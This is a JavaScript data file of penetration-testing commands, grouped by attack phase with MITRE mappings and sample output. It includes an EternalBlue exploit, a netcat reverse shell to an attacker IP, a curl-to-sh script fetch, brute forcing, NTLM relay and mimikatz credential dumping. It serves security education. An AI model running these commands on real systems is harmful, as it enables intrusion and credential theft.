// Attack Commands Reference Database
// Comprehensive ethical pentesting command reference organized by category
// For authorized security testing and education only

export const ATTACK_COMMANDS_DB = [
  // ============================================================
  // RECONNAISSANCE
  // ============================================================
  {
    category: "Reconnaissance",
    tool: "nmap",
    command: "nmap -sn 192.168.1.0/24",
    os: "Linux/macOS/Windows",
    description: "Host discovery scan (ping sweep) — find live hosts without port scanning. Uses ICMP echo, TCP SYN to 443, TCP ACK to 80, and ICMP timestamp.",
    mitre: "T1046 — Network Service Discovery",
    example: "Nmap scan report for 192.168.1.1\nHost is up (0.0030s latency).\nNmap scan report for 192.168.1.105\nHost is up (0.0045s latency)."
  },
  {
    category: "Reconnaissance",
    tool: "nmap",
    command: "nmap -sV -sC -O -p- -T4 -oA full_scan 10.10.10.5",
    os: "Linux/macOS",
    description: "Full TCP port scan with version detection (-sV), default scripts (-sC), OS detection (-O), all ports (-p-), aggressive timing (-T4), output all formats (-oA).",
    mitre: "T1046 — Network Service Discovery",
    example: "PORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 8.9p1\n80/tcp  open  http    Apache httpd 2.4.52\n443/tcp open  ssl/http nginx 1.18.0"
  },
  {
    category: "Reconnaissance",
    tool: "nmap",
    command: "nmap -sU -sV --top-ports 100 10.10.10.5",
    os: "Linux/macOS",
    description: "UDP port scan with version detection on top 100 UDP ports. UDP scanning is slow — use --top-ports to limit scope.",
    mitre: "T1046 — Network Service Discovery",
    example: "PORT    STATE         SERVICE VERSION\n53/udp  open          domain  ISC BIND 9.18.1\n161/udp open          snmp    SNMPv2c\n123/udp open          ntp     NTP v4"
  },
  {
    category: "Reconnaissance",
    tool: "nmap",
    command: "nmap --script vuln -p 80,443,445,3389 10.10.10.5",
    os: "Linux/macOS",
    description: "Run vulnerability detection NSE scripts against common service ports. Checks for known CVEs, misconfigurations, and default credentials.",
    mitre: "T1595.002 — Vulnerability Scanning",
    example: "PORT    STATE SERVICE\n445/tcp open  microsoft-ds\n|_smb-vuln-ms17-010: VULNERABLE\n|   Remote Code Execution vulnerability in Microsoft SMBv1"
  },
  {
    category: "Reconnaissance",
    tool: "masscan",
    command: "masscan -p1-65535 --rate=1000 -e eth0 10.10.10.0/24 -oG masscan_results.gnmap",
    os: "Linux",
    description: "Fast full-port scan of entire /24 subnet at 1000 packets/sec. Masscan uses its own TCP stack — much faster than nmap for large-scale scanning.",
    mitre: "T1046 — Network Service Discovery",
    example: "Discovered open port 22/tcp on 10.10.10.5\nDiscovered open port 80/tcp on 10.10.10.5\nDiscovered open port 3306/tcp on 10.10.10.12"
  },
  {
    category: "Reconnaissance",
    tool: "dig",
    command: "dig axfr @ns1.example.com example.com",
    os: "Linux/macOS",
    description: "Attempt DNS zone transfer — if successful, retrieves all DNS records for the domain including internal hostnames.",
    mitre: "T1590.002 — Gather Victim Network Information: DNS",
    example: "example.com.    3600 IN A     93.184.216.34\nmail.example.com. 3600 IN A   93.184.216.35\ndev.example.com. 3600 IN A    10.0.1.50\n_internal.example.com. 3600 IN A 10.0.1.100"
  },
  {
    category: "Reconnaissance",
    tool: "dig",
    command: "dig +short txt _dmarc.example.com && dig +short txt example.com | grep spf",
    os: "Linux/macOS",
    description: "Check DMARC and SPF records — weak email authentication policies indicate spoofing potential.",
    mitre: "T1589.002 — Gather Victim Identity Information: Email Addresses",
    example: "\"v=DMARC1; p=none; rua=mailto:dmarc@example.com\"\n\"v=spf1 include:_spf.google.com ~all\""
  },
  {
    category: "Reconnaissance",
    tool: "whois",
    command: "whois example.com",
    os: "Linux/macOS",
    description: "Query WHOIS database for domain registration details — registrant info, name servers, creation/expiration dates.",
    mitre: "T1596.002 — Search Open Technical Databases: WHOIS",
    example: "Domain Name: EXAMPLE.COM\nRegistrar: MarkMonitor Inc.\nCreation Date: 1995-08-14\nRegistrant Organization: Example Corp\nName Server: ns1.example.com"
  },
  {
    category: "Reconnaissance",
    tool: "theHarvester",
    command: "theHarvester -d example.com -b all -l 500 -f harvest_results",
    os: "Linux",
    description: "Gather emails, subdomains, hosts, and employee names from public sources (Google, Bing, LinkedIn, Shodan, DNSDumpster, etc.).",
    mitre: "T1589.002 — Gather Victim Identity Information: Email Addresses",
    example: "[*] Emails found:\nadmin@example.com\njohn.doe@example.com\n[*] Hosts found:\nwww.example.com: 93.184.216.34\nmail.example.com: 93.184.216.35"
  },
  {
    category: "Reconnaissance",
    tool: "subfinder",
    command: "subfinder -d example.com -all -o subdomains.txt",
    os: "Linux/macOS",
    description: "Fast passive subdomain enumeration using multiple sources (crt.sh, Censys, SecurityTrails, Shodan, VirusTotal, etc.).",
    mitre: "T1590.002 — Gather Victim Network Information: DNS",
    example: "www.example.com\napi.example.com\nstaging.example.com\ndev.example.com\nmail.example.com"
  },
  {
    category: "Reconnaissance",
    tool: "amass",
    command: "amass enum -active -d example.com -src -ip -dir amass_output",
    os: "Linux",
    description: "Active subdomain enumeration with source attribution and IP resolution. Combines passive sources with active DNS brute force and zone walking.",
    mitre: "T1590.002 — Gather Victim Network Information: DNS",
    example: "[crt.sh] www.example.com 93.184.216.34\n[SecurityTrails] api.example.com 93.184.216.35\n[DNS Brute] internal.example.com 10.0.1.50"
  },
  {
    category: "Reconnaissance",
    tool: "shodan",
    command: "shodan search 'org:\"Example Corp\" port:22,3389,445'",
    os: "Linux/macOS",
    description: "Search Shodan for internet-facing services belonging to target organization. Identify exposed management ports.",
    mitre: "T1596.005 — Search Open Technical Databases: Scan Databases",
    example: "10.20.30.40  22/tcp  OpenSSH 7.9\n10.20.30.41  3389/tcp Microsoft Terminal Services\n10.20.30.42  445/tcp  Windows Server 2019"
  },
  {
    category: "Reconnaissance",
    tool: "gobuster",
    command: "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 -o dirs.txt",
    os: "Linux",
    description: "Directory and file brute forcing. Discovers hidden directories and files on web servers. -x specifies extensions, -t thread count.",
    mitre: "T1595.003 — Active Scanning: Wordlist Scanning",
    example: "/admin (Status: 301)\n/login.php (Status: 200)\n/backup (Status: 403)\n/config.txt (Status: 200)\n/.htaccess (Status: 403)"
  },
  {
    category: "Reconnaissance",
    tool: "ffuf",
    command: "ffuf -u http://10.10.10.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -o ffuf_results.json",
    os: "Linux",
    description: "Fast web fuzzer for directory discovery, parameter brute forcing, and virtual host enumeration. Faster than gobuster with more features.",
    mitre: "T1595.003 — Active Scanning: Wordlist Scanning",
    example: "[Status: 200, Size: 4523, Words: 233] -> /index.html\n[Status: 301, Size: 0, Words: 0]   -> /admin\n[Status: 200, Size: 102, Words: 8]  -> /robots.txt"
  },
  {
    category: "Reconnaissance",
    tool: "wpscan",
    command: "wpscan --url http://10.10.10.5 --enumerate u,vp,vt,dbe --api-token YOUR_TOKEN -o wpscan.txt",
    os: "Linux",
    description: "WordPress vulnerability scanner. Enumerates users (u), vulnerable plugins (vp), vulnerable themes (vt), and database exports (dbe).",
    mitre: "T1595.002 — Vulnerability Scanning",
    example: "[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09)\n[+] admin (id: 1) found via Author ID Brute Forcing\n[!] Title: Plugin XYZ < 3.2.1 - SQL Injection (CVE-2023-XXXX)"
  },
  {
    category: "Reconnaissance",
    tool: "enum4linux-ng",
    command: "enum4linux-ng -A 10.10.10.5 -oA enum4linux_results",
    os: "Linux",
    description: "Complete Windows/Samba enumeration. Discovers users, groups, shares, password policies, OS info via SMB, LDAP, RPC, and NetBIOS.",
    mitre: "T1087 — Account Discovery",
    example: "Users:\n  Administrator (RID: 500)\n  guest (RID: 501)\n  john.doe (RID: 1001)\nShares:\n  IPC$ (Type: IPC)\n  ADMIN$ (Type: Disk)\n  Users (Type: Disk)"
  },
  {
    category: "Reconnaissance",
    tool: "nikto",
    command: "nikto -h http://10.10.10.5 -o nikto_scan.html -Format htm -Tuning x6",
    os: "Linux",
    description: "Web server vulnerability scanner. Checks for dangerous files, outdated software, misconfigurations. Tuning x6 focuses on authentication issues.",
    mitre: "T1595.002 — Vulnerability Scanning",
    example: "+ Server: Apache/2.4.52\n+ OSVDB-3268: /icons/: Directory indexing found.\n+ Server leaks inodes via ETags\n+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE\n+ OSVDB-877: HTTP TRACE method is active"
  },
  {
    category: "Reconnaissance",
    tool: "rustscan",
    command: "rustscan -a 10.10.10.5 --ulimit 5000 -- -sV -sC -A",
    os: "Linux",
    description: "Ultra-fast port scanner in Rust. Scans all 65535 ports in seconds, then pipes open ports to nmap for service detection. -- passes flags to nmap.",
    mitre: "T1046 — Network Service Discovery",
    example: "Open 10.10.10.5:22\nOpen 10.10.10.5:80\nOpen 10.10.10.5:3306\n[~] Starting Nmap 7.94 scan on ports 22,80,3306"
  },

  // ============================================================
  // SCANNING & ENUMERATION
  // ============================================================
  {
    category: "Scanning",
    tool: "nmap",
    command: "nmap -Pn -sS -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery 10.10.10.0/24",
    os: "Linux",
    description: "SMB enumeration across subnet — discover shares, users, and OS versions. -Pn skips ping (useful when ICMP is blocked).",
    mitre: "T1135 — Network Share Discovery",
    example: "Host script results:\n| smb-enum-shares:\n|   ADMIN$ (Type: STYPE_DISKTREE_HIDDEN)\n|   C$ (Type: STYPE_DISKTREE_HIDDEN)\n|   SharedDocs (Type: STYPE_DISKTREE)"
  },
  {
    category: "Scanning",
    tool: "crackmapexec",
    command: "crackmapexec smb 10.10.10.0/24 -u '' -p '' --shares",
    os: "Linux",
    description: "Enumerate SMB shares across subnet with null session. CrackMapExec (now NetExec) is the Swiss army knife for Active Directory pentesting.",
    mitre: "T1135 — Network Share Discovery",
    example: "SMB  10.10.10.5   445  DC01  [*] Windows Server 2019 Build 17763\nSMB  10.10.10.5   445  DC01  [+] \\\\: (null session)\nSMB  10.10.10.5   445  DC01  [+] Shares: IPC$, NETLOGON, SYSVOL, Users"
  },
  {
    category: "Scanning",
    tool: "ldapsearch",
    command: "ldapsearch -x -H ldap://10.10.10.5 -D '' -w '' -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName userPrincipalName memberOf",
    os: "Linux",
    description: "LDAP anonymous bind enumeration of Active Directory users, UPNs, and group memberships.",
    mitre: "T1087.002 — Account Discovery: Domain Account",
    example: "dn: CN=John Doe,OU=Users,DC=corp,DC=local\nsAMAccountName: jdoe\nuserPrincipalName: jdoe@corp.local\nmemberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local"
  },
  {
    category: "Scanning",
    tool: "rpcclient",
    command: "rpcclient -U '' -N 10.10.10.5 -c 'enumdomusers; enumdomgroups; querydominfo'",
    os: "Linux",
    description: "Enumerate domain users, groups, and domain info via RPC null session. Essential for AD enumeration when LDAP anonymous bind is disabled.",
    mitre: "T1087.002 — Account Discovery: Domain Account",
    example: "user:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[john.doe] rid:[0x3e9]\ngroup:[Domain Admins] rid:[0x200]"
  },
  {
    category: "Scanning",
    tool: "smbclient",
    command: "smbclient -L //10.10.10.5 -N && smbclient //10.10.10.5/Users -N -c 'recurse; ls'",
    os: "Linux",
    description: "List SMB shares with null session, then recursively list all files in the Users share. Look for sensitive files (passwords, configs, keys).",
    mitre: "T1135 — Network Share Discovery",
    example: "Sharename  Type    Comment\nUsers      Disk    \n  \\john.doe\\Desktop\\passwords.txt\n  \\john.doe\\Documents\\vpn_config.ovpn"
  },
  {
    category: "Scanning",
    tool: "snmpwalk",
    command: "snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1",
    os: "Linux",
    description: "Walk SNMP MIB tree with community string 'public'. Extracts system info, interfaces, routing tables, ARP cache, running processes.",
    mitre: "T1046 — Network Service Discovery",
    example: "SNMPv2-MIB::sysDescr.0 = STRING: Linux router1 5.15.0\nSNMPv2-MIB::sysContact.0 = STRING: admin@example.com\nIF-MIB::ifDescr.2 = STRING: eth0\nHOST-RESOURCES-MIB::hrSWRunName.1 = STRING: sshd"
  },
  {
    category: "Scanning",
    tool: "onesixtyone",
    command: "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.0/24",
    os: "Linux",
    description: "Fast SNMP community string brute forcer. Tests common community strings against entire subnet simultaneously.",
    mitre: "T1046 — Network Service Discovery",
    example: "10.10.10.5 [public] Linux router1 5.15.0\n10.10.10.10 [private] Cisco IOS 15.7\n10.10.10.20 [monitoring] HP ProCurve Switch"
  },
  {
    category: "Scanning",
    tool: "bloodhound",
    command: "bloodhound-python -u 'jdoe' -p 'Password123' -d corp.local -ns 10.10.10.5 -c All --zip",
    os: "Linux",
    description: "BloodHound data collection — enumerates AD objects, ACLs, sessions, trusts to map attack paths to Domain Admin. Import the zip into BloodHound GUI.",
    mitre: "T1087.002 — Account Discovery: Domain Account",
    example: "INFO: Found AD domain: corp.local\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: dc01.corp.local\nINFO: Found 1523 users, 847 groups, 234 computers\nINFO: Compressing output to bloodhound_20240101.zip"
  },
  {
    category: "Scanning",
    tool: "certipy",
    command: "certipy find -u 'jdoe@corp.local' -p 'Password123' -dc-ip 10.10.10.5 -vulnerable -stdout",
    os: "Linux",
    description: "Enumerate AD Certificate Services (ADCS) for vulnerable certificate templates. Finds ESC1-ESC8 misconfigured templates for privilege escalation.",
    mitre: "T1649 — Steal or Forge Authentication Certificates",
    example: "Certificate Templates\n  Template Name: UserTemplate\n  Enabled: True\n  Client Authentication: True\n  Enrollment Rights: Domain Users\n  [!] Vulnerable to ESC1: Allows SAN specification"
  },
  {
    category: "Scanning",
    tool: "testssl.sh",
    command: "testssl.sh --severity HIGH --wide --color 3 https://example.com",
    os: "Linux",
    description: "Comprehensive TLS/SSL security testing. Checks protocols, ciphers, vulnerabilities (Heartbleed, POODLE, ROBOT, etc.), certificate details, and HSTS.",
    mitre: "T1595.002 — Vulnerability Scanning",
    example: "Testing protocols:\n  SSLv2      not offered\n  SSLv3      not offered\n  TLS 1.0    not offered\n  TLS 1.2    offered\n  TLS 1.3    offered (OK)\nTesting vulnerabilities:\n  Heartbleed   not vulnerable\n  CCS          not vulnerable\n  ROBOT        not vulnerable"
  },

  // ============================================================
  // EXPLOITATION
  // ============================================================
  {
    category: "Exploitation",
    tool: "metasploit",
    command: "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.5; set LHOST 10.10.14.2; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit'",
    os: "Linux",
    description: "Exploit EternalBlue (MS17-010) SMBv1 vulnerability for remote code execution. Returns Meterpreter shell on vulnerable Windows systems.",
    mitre: "T1210 — Exploitation of Remote Services",
    example: "[*] Started reverse TCP handler on 10.10.14.2:4444\n[*] 10.10.10.5:445 - Connecting to target\n[*] 10.10.10.5:445 - Sending exploit packet\n[*] Meterpreter session 1 opened"
  },
  {
    category: "Exploitation",
    tool: "sqlmap",
    command: "sqlmap -u 'http://10.10.10.5/login.php?id=1' --dbs --batch --risk=3 --level=5 --random-agent --tamper=space2comment",
    os: "Linux",
    description: "Automated SQL injection detection and exploitation. --dbs enumerates databases, --batch auto-answers prompts, --tamper for WAF bypass.",
    mitre: "T1190 — Exploit Public-Facing Application",
    example: "[*] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[*] testing 'MySQL >= 5.0.12 time-based blind'\n[+] Parameter: id (GET)\n    Type: boolean-based blind\n    Payload: id=1' AND 5732=5732 AND 'tOMn'='tOMn\navailable databases:\n[*] information_schema\n[*] mysql\n[*] webapp_db"
  },
  {
    category: "Exploitation",
    tool: "sqlmap",
    command: "sqlmap -u 'http://10.10.10.5/login.php?id=1' -D webapp_db -T users --dump --batch",
    os: "Linux",
    description: "Dump the users table from webapp_db database after SQLi is confirmed. Extracts credentials, emails, and other sensitive data.",
    mitre: "T1190 — Exploit Public-Facing Application",
    example: "+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |\n| 2  | john     | 098f6bcd4621d373cade4e832627b4f6 |"
  },
  {
    category: "Exploitation",
    tool: "hydra",
    command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 ssh -t 4 -V -f",
    os: "Linux",
    description: "Brute force SSH login. -l username, -P password wordlist, -t threads (keep low for SSH), -V verbose, -f stop on first valid password.",
    mitre: "T1110.001 — Brute Force: Password Guessing",
    example: "[DATA] attacking ssh://10.10.10.5:22/\n[22][ssh] host: 10.10.10.5   login: admin   password: password123\n[STATUS] attack finished for 10.10.10.5 (valid pair found)"
  },
  {
    category: "Exploitation",
    tool: "hydra",
    command: "hydra -L users.txt -P passwords.txt 10.10.10.5 http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials' -t 16 -f",
    os: "Linux",
    description: "Brute force web login form. Specify form action, parameter names with ^USER^/^PASS^ placeholders, and failure string to detect invalid logins.",
    mitre: "T1110.001 — Brute Force: Password Guessing",
    example: "[80][http-post-form] host: 10.10.10.5   login: admin   password: letmein\n1 of 1 target successfully completed, 1 valid password found"
  },
  {
    category: "Exploitation",
    tool: "john",
    command: "john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hashes.txt",
    os: "Linux/macOS",
    description: "Crack password hashes with wordlist and mutation rules. Supports MD5, SHA, NTLM, Kerberos, ZIP, PDF, SSH keys, and 400+ formats.",
    mitre: "T1110.002 — Brute Force: Password Cracking",
    example: "Loaded 3 password hashes with no different salts (NT)\npassword123      (Administrator)\nletmein          (john.doe)\nqwerty           (service_acct)\n3 password hashes cracked, 0 left"
  },
  {
    category: "Exploitation",
    tool: "hashcat",
    command: "hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force",
    os: "Linux",
    description: "GPU-accelerated password cracking. -m 1000 = NTLM, -a 0 = dictionary attack, -r = mutation rules. 100x+ faster than CPU cracking.",
    mitre: "T1110.002 — Brute Force: Password Cracking",
    example: "32ed87bdb5fdc5e9cba88547376818d4:password123\na4f49c406510bdcab6824ee7c30fd852:Summer2024!\nSession..........: hashcat\nSpeed.#1.........:  5234.2 MH/s"
  },
  {
    category: "Exploitation",
    tool: "impacket",
    command: "python3 impacket-psexec corp.local/administrator:'Password123'@10.10.10.5",
    os: "Linux",
    description: "Remote code execution via PsExec using Impacket. Uploads a service binary to ADMIN$ share, creates and starts a service, returns interactive shell.",
    mitre: "T1569.002 — System Services: Service Execution",
    example: "[*] Requesting shares on 10.10.10.5\n[*] Found writable share ADMIN$\n[*] Uploading file qNxWLwOd.exe\n[*] Opening SVCManager on 10.10.10.5\n[*] Creating service on 10.10.10.5\nC:\\Windows\\system32>"
  },
  {
    category: "Exploitation",
    tool: "impacket",
    command: "python3 impacket-wmiexec corp.local/administrator:'Password123'@10.10.10.5",
    os: "Linux",
    description: "Remote execution via WMI (Windows Management Instrumentation). More stealthy than PsExec — no service creation, uses DCOM/WMI for execution.",
    mitre: "T1047 — Windows Management Instrumentation",
    example: "[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell\nC:\\>"
  },
  {
    category: "Exploitation",
    tool: "evil-winrm",
    command: "evil-winrm -i 10.10.10.5 -u administrator -p 'Password123' -s /opt/powershell_scripts/ -e /opt/executables/",
    os: "Linux",
    description: "WinRM shell with built-in upload/download, PowerShell script loading, and .NET assembly execution. Uses port 5985 (HTTP) or 5986 (HTTPS).",
    mitre: "T1021.006 — Remote Services: Windows Remote Management",
    example: "Evil-WinRM shell v3.5\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>"
  },
  {
    category: "Exploitation",
    tool: "responder",
    command: "responder -I eth0 -wFb",
    os: "Linux",
    description: "LLMNR/NBT-NS/mDNS poisoner. Captures NTLM hashes by responding to broadcast name resolution queries. -w enables WPAD proxy, -F forces NTLM auth, -b starts HTTP auth.",
    mitre: "T1557.001 — LLMNR/NBT-NS Poisoning",
    example: "[+] Listening for events...\n[*] [LLMNR]  Poisoned answer sent to 10.10.10.50 for name fileserver\n[HTTP] NTLMv2 Client   : 10.10.10.50\n[HTTP] NTLMv2 Username : CORP\\jdoe\n[HTTP] NTLMv2 Hash     : jdoe::CORP:abc123..."
  },
  {
    category: "Exploitation",
    tool: "impacket",
    command: "python3 impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe",
    os: "Linux",
    description: "NTLM relay attack — capture NTLMv2 auth from Responder and relay to targets. -e executes payload when relaying to SMB targets with admin access.",
    mitre: "T1557.001 — LLMNR/NBT-NS Poisoning",
    example: "[*] Servers started\n[*] HTTPD: Received connection from 10.10.10.50\n[*] SMBD-Thread-4: Connection from 10.10.10.50\n[*] Authenticating against 10.10.10.5 as CORP\\jdoe SUCCEED\n[*] Service installed and started"
  },
  {
    category: "Exploitation",
    tool: "xsstrike",
    command: "xsstrike -u 'http://10.10.10.5/search?q=test' --crawl -l 3",
    os: "Linux",
    description: "Advanced XSS detection with DOM analysis, WAF detection/bypass, and context-aware payload generation. --crawl spider the site, -l depth level.",
    mitre: "T1059.007 — Command and Scripting Interpreter: JavaScript",
    example: "[~] Checking for DOM vulnerabilities\n[+] WAF Status: Offline\n[+] Parameter: q\n[+] Reflection found\n[+] Payload: <d3v/onmouseover=[2].find(confirm)>\n[+] Efficiency: 95%"
  },
  {
    category: "Exploitation",
    tool: "nuclei",
    command: "nuclei -u http://10.10.10.5 -t /opt/nuclei-templates/ -severity critical,high -o nuclei_results.txt",
    os: "Linux",
    description: "Fast vulnerability scanner with community-maintained template library. Checks for CVEs, misconfigurations, default credentials, exposed panels, and more.",
    mitre: "T1595.002 — Vulnerability Scanning",
    example: "[critical] [CVE-2021-44228] [http] http://10.10.10.5:8080\n[high] [CVE-2023-22515] [http] http://10.10.10.5:8090/server-info.action\n[high] [default-login] [http] http://10.10.10.5:8080/manager [tomcat:tomcat]"
  },

  // ============================================================
  // PRIVILEGE ESCALATION
  // ============================================================
  {
    category: "Privilege Escalation",
    tool: "linpeas",
    command: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
    os: "Linux",
    description: "Linux privilege escalation enumeration script. Checks SUID binaries, capabilities, cron jobs, writable files, kernel exploits, credentials, and 100+ escalation vectors.",
    mitre: "T1068 — Exploitation for Privilege Escalation",
    example: "════════════════════════════════════════╗\n║ SUID - Check easy privesc, exploits  ║\n╠══════════════════════════════════════╣\n-rwsr-xr-x 1 root root  /usr/bin/pkexec\n-rwsr-xr-x 1 root root  /usr/local/bin/custom_tool"
  },
  {
    category: "Privilege Escalation",
    tool: "winpeas",
    command: "winPEASany.exe quiet systeminfo userinfo servicesinfo applicationsinfo networkinfo",
    os: "Windows",
    description: "Windows privilege escalation enumeration. Checks service misconfigurations, unquoted paths, AlwaysInstallElevated, token privileges, saved credentials, and more.",
    mitre: "T1068 — Exploitation for Privilege Escalation",
    example: "════════════════════════════════════════════╗\n║ Interesting Services - Non Microsoft     ║\n╠══════════════════════════════════════════╣\n CustomService(Custom Service)[C:\\Program Files\\custom service\\svc.exe]\n   Permissions: Everyone [AllAccess]"
  },
  {
    category: "Privilege Escalation",
    tool: "sudo",
    command: "sudo -l",
    os: "Linux",
    description: "List sudo permissions for current user. Check GTFOBins for any binary that can be escalated (vim, find, python, perl, awk, less, nano, tar, zip, etc.).",
    mitre: "T1548.003 — Abuse Elevation Control Mechanism: Sudo",
    example: "User www-data may run the following commands:\n    (ALL) NOPASSWD: /usr/bin/vim\n    (ALL) NOPASSWD: /usr/bin/find\n    (root) NOPASSWD: /usr/bin/python3"
  },
  {
    category: "Privilege Escalation",
    tool: "find",
    command: "find / -perm -4000 -type f 2>/dev/null",
    os: "Linux",
    description: "Find all SUID binaries. SUID binaries run as file owner (usually root). Check each against GTFOBins for privilege escalation opportunities.",
    mitre: "T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid",
    example: "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/local/bin/backup_script\n/opt/custom/admin_tool"
  },
  {
    category: "Privilege Escalation",
    tool: "find",
    command: "find / -writable -type f 2>/dev/null | grep -E '(cron|service|timer|path|profile|bashrc|sudoers)'",
    os: "Linux",
    description: "Find writable system files that could be exploited for privilege escalation — cron jobs, services, PATH directories, shell profiles.",
    mitre: "T1053.003 — Scheduled Task/Job: Cron",
    example: "/etc/cron.d/backup_job\n/opt/scripts/cleanup.sh\n/usr/local/bin/maintenance"
  },
  {
    category: "Privilege Escalation",
    tool: "getcap",
    command: "getcap -r / 2>/dev/null",
    os: "Linux",
    description: "Find binaries with Linux capabilities set. Capabilities like cap_setuid, cap_net_raw, cap_dac_override can enable privilege escalation.",
    mitre: "T1548 — Abuse Elevation Control Mechanism",
    example: "/usr/bin/python3.10 cap_setuid=ep\n/usr/bin/perl cap_setuid+ep\n/usr/sbin/tcpdump cap_net_raw+ep"
  },
  {
    category: "Privilege Escalation",
    tool: "python3",
    command: "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    os: "Linux",
    description: "Exploit Python with cap_setuid capability or SUID to escalate to root shell. Works when python3 has setuid capability.",
    mitre: "T1548 — Abuse Elevation Control Mechanism",
    example: "root@victim:~# id\nuid=0(root) gid=1000(user) groups=1000(user)"
  },
  {
    category: "Privilege Escalation",
    tool: "pspy",
    command: "./pspy64 -pf -i 1000",
    os: "Linux",
    description: "Monitor processes without root — detects cron jobs, scripts run by other users, and scheduled tasks. -pf enables file system events, -i interval in ms.",
    mitre: "T1057 — Process Discovery",
    example: "CMD: UID=0    PID=1234  | /bin/bash /opt/scripts/backup.sh\nCMD: UID=0    PID=1235  | /usr/bin/python3 /root/cleanup.py\nCMD: UID=0    PID=1236  | mysql -u root -pSuperSecret123 dbname"
  },
  {
    category: "Privilege Escalation",
    tool: "icacls",
    command: "icacls \"C:\\Program Files\\Custom Service\\service.exe\"",
    os: "Windows",
    description: "Check Windows file/directory permissions. Look for services where low-privilege users have Modify (M) or Full Control (F) on the service binary or directory.",
    mitre: "T1574.010 — Hijack Execution Flow: Services File Permissions Weakness",
    example: "C:\\Program Files\\Custom Service\\service.exe BUILTIN\\Users:(M)\n                                               NT AUTHORITY\\SYSTEM:(F)\n                                               BUILTIN\\Administrators:(F)"
  },
  {
    category: "Privilege Escalation",
    tool: "powerup",
    command: "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks | Out-File -Encoding ASCII checks.txt\"",
    os: "Windows",
    description: "PowerUp.ps1 — comprehensive Windows privilege escalation checker. Tests service misconfigs, unquoted paths, DLL hijacking, registry autoruns, AlwaysInstallElevated.",
    mitre: "T1068 — Exploitation for Privilege Escalation",
    example: "[*] Checking for unquoted service paths...\nServiceName   : CustomSvc\nPath          : C:\\Program Files\\Custom Service\\svc.exe\nModifiablePath: C:\\Program Files\\Custom Service\\\nCanRestart    : True"
  },
  {
    category: "Privilege Escalation",
    tool: "juicypotato",
    command: "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe -e cmd.exe 10.10.14.2 4444\" -t *",
    os: "Windows",
    description: "Exploit SeImpersonatePrivilege (held by service accounts like IIS, MSSQL) to escalate to SYSTEM via COM object impersonation. For Windows 10+, use PrintSpoofer or GodPotato.",
    mitre: "T1134.001 — Access Token Manipulation: Token Impersonation/Theft",
    example: "[+] CreateProcessWithTokenW OK\n[+] Got SYSTEM shell on 10.10.14.2:4444"
  },
  {
    category: "Privilege Escalation",
    tool: "printspoofer",
    command: "PrintSpoofer64.exe -i -c cmd",
    os: "Windows",
    description: "Exploit SeImpersonatePrivilege on Windows 10/Server 2019+ via print spooler named pipe impersonation. Replacement for JuicyPotato on newer Windows.",
    mitre: "T1134.001 — Access Token Manipulation: Token Impersonation/Theft",
    example: "[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe listening...\n[+] CreateProcessAsUser() OK\nMicrosoft Windows [Version 10.0.17763.1]\nC:\\Windows\\system32>whoami\nnt authority\\system"
  },
  {
    category: "Privilege Escalation",
    tool: "mimikatz",
    command: "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
    os: "Windows",
    description: "Extract plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory. Requires SeDebugPrivilege (admin/SYSTEM).",
    mitre: "T1003.001 — OS Credential Dumping: LSASS Memory",
    example: "Authentication Id : 0 ; 12345678\nSession           : Interactive\nUser Name         : administrator\nDomain            : CORP\nNTLM Hash         : 32ed87bdb5fdc5e9cba88547376818d4\nSHA1 Hash         : a4f49c406510bdcab6824ee7c30fd852"
  },
  {
    category: "Privilege Escalation",
    tool: "mimikatz",
    command: "mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:corp.local /user:krbtgt\" \"exit\"",
    os: "Windows",
    description: "DCSync attack — replicate domain controller data (krbtgt hash) using Directory Replication Service. Requires Replicating Directory Changes permission (Domain Admins by default).",
    mitre: "T1003.006 — OS Credential Dumping: DCSync",
    example: "Object RDN           : krbtgt\nHash NTLM: a577fcf16cfef780a2ceb343ec39a0d9\nCredentials:\n  aes256_hmac: 9b2a1d3e5f7a8c0b..."
  },

  // ============================================================
  // LATERAL MOVEMENT
  // ============================================================
  {
    category: "Lateral Movement",
    tool: "impacket",
    command: "python3 impacket-smbexec corp.local/administrator@10.10.10.5 -hashes :32ed87bdb5fdc5e9cba88547376818d4",
    os: "Linux",
